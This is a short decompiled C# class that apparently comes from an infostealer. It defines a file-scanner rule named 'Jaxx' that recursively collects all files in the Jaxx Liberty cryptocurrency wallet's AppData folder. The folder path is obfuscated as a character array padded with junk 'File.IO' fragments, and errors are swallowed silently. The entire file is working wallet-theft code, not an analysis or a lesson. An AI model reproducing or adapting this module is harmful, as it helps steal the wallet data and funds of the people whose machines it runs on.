using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000020 RID: 32
public class Jx : FileScannerRule
{
	// Token: 0x06000080 RID: 128 RVA: 0x000060D0 File Offset: 0x000042D0
	public Jx()
	{
		base.Name = new string(new char[]
		{
			'J',
			'a',
			'x',
			'x'
		});
	}

	// Token: 0x06000081 RID: 129 RVA: 0x00004F07 File Offset: 0x00003107
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x06000082 RID: 130 RVA: 0x000060F4 File Offset: 0x000042F4
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[]
			{
				'\\',
				'c',
				'o',
				'F',
				'i',
				'l',
				'e',
				'.',
				'I',
				'O',
				'm',
				'.',
				'l',
				'i',
				'b',
				'e',
				'F',
				'i',
				'l',
				'e',
				'.',
				'I',
				'O',
				'r',
				't',
				'y',
				'.',
				'j',
				'F',
				'i',
				'l',
				'e',
				'.',
				'I',
				'O',
				'a',
				'x',
				'F',
				'i',
				'l',
				'e',
				'.',
				'I',
				'O',
				'x'
			}).Replace("File.IO", string.Empty);
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = new string(new char[]
				{
					'*'
				}),
				Recoursive = true
			});
		}
		catch
		{
		}
		return list;
	}
}
